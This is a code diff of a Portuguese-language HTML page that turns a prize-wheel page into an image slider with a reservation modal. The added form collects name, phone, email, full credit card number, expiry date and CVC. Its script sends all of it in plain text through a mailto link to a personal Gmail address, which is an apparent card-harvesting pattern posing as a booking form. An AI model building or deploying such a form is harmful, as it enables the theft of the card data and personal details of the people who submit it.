@@ -1,67 +1,137 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roleta de Prêmios</title>
+    <title>Slider Mobile</title>
     <style>
         body {
-            margin: 0;
-            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
+            flex-direction: column;
             height: 100vh;
-            background-image: url('roda.png');
-            background-size: cover;
-            background-position: center;
+            background-color: #f4f4f4;
+            margin: 0;
         }
-        #wheel {
-            width: 300px;
-            height: 300px;
-            border-radius: 50%;
+        .slider {
             position: relative;
+            width: 90%;
+            max-width: 400px;
             overflow: hidden;
-            transform: rotate(0deg);
-            transition: transform 4s ease-out;
-            background-image: url('roleta.png');
-            background-size: cover;
-            background-position: center;
         }
-        #pointer {
-            width: 0; 
-            height: 0; 
-            border-left: 20px solid transparent;
-            border-right: 20px solid transparent;
-            border-bottom: 40px solid #000;
+        .slides {
+            display: flex;
+            transition: transform 0.5s ease-in-out;
+        }
+        .slides img {
+            width: 100%;
+            border-radius: 10px;
+        }
+        .btn {
             position: absolute;
-            top: -40px;
-            left: 50%;
-            transform: translateX(-50%);
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: rgba(0, 0, 0, 0.5);
+            color: white;
+            border: none;
+            padding: 10px;
+            cursor: pointer;
+            border-radius: 5px;
         }
-        #spin {
+        .btn-left {
+            left: 10px;
+        }
+        .btn-right {
+            right: 10px;
+        }
+        .reserve-btn {
             margin-top: 20px;
             padding: 10px 20px;
-            font-size: 16px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
             cursor: pointer;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
         }
     </style>
 </head>
 <body>
-    <div id="wheel">
-        <div id="pointer"></div>
+    <div class="slider">
+        <button class="btn btn-left" onclick="prevSlide()">&#10094;</button>
+        <div class="slides">
+            <img src="imagem1.jpg" alt="Imagem 1">
+            <img src="imagem2.jpg" alt="Imagem 2">
+            <img src="imagem3.jpg" alt="Imagem 3">
+            <img src="imagem4.jpg" alt="Imagem 4">
+            <img src="imagem5.jpg" alt="Imagem 5">
+        </div>
+        <button class="btn btn-right" onclick="nextSlide()">&#10095;</button>
     </div>
-    <button id="spin">Play</button>
-
+    
+    <button class="reserve-btn" onclick="openModal()">Faça sua reserva</button>
+    
+    <div class="modal" id="modal">
+        <h2>Reserva</h2>
+        <form id="reservation-form">
+            <label>Nome:</label>
+            <input type="text" name="nome" required><br>
+            <label>Sobrenome:</label>
+            <input type="text" name="sobrenome" required><br>
+            <label>Telefone:</label>
+            <input type="tel" name="telefone" required><br>
+            <label>Email:</label>
+            <input type="email" name="email" required><br>
+            <label>Número do cartão de crédito:</label>
+            <input type="text" name="cartao" required><br>
+            <label>Data de validade:</label>
+            <input type="month" name="validade" required><br>
+            <label>Código CVC:</label>
+            <input type="text" name="cvc" required><br>
+            <p>Valor mensal: €200</p>
+            <button type="submit">Enviar Reserva</button>
+        </form>
+    </div>
+    
     <script>
-        const wheel = document.getElementById('wheel');
-        const spinBtn = document.getElementById('spin');
-        let deg = 0;
-
-        spinBtn.addEventListener('click', () => {
-            deg = Math.floor(5000 + Math.random() * 5000);
-            wheel.style.transition = 'transform 4s ease-out';
-            wheel.style.transform = `rotate(${deg}deg)`;
+        let currentIndex = 0;
+        const slides = document.querySelector('.slides');
+        const totalSlides = document.querySelectorAll('.slides img').length;
+        
+        function updateSlide() {
+            slides.style.transform = `translateX(-${currentIndex * 100}%)`;
+        }
+        
+        function prevSlide() {
+            currentIndex = (currentIndex === 0) ? totalSlides - 1 : currentIndex - 1;
+            updateSlide();
+        }
+        
+        function nextSlide() {
+            currentIndex = (currentIndex === totalSlides - 1) ? 0 : currentIndex + 1;
+            updateSlide();
+        }
+        
+        function openModal() {
+            document.getElementById('modal').style.display = 'block';
+        }
+        
+        document.getElementById('reservation-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const formData = new FormData(this);
+            const emailBody = Array.from(formData.entries()).map(entry => entry.join(': ')).join('\n');
+            window.location.href = `mailto:ronald28int@gmail.com?subject=Reserva&body=${encodeURIComponent(emailBody)}`;
         });
     </script>
 </body>
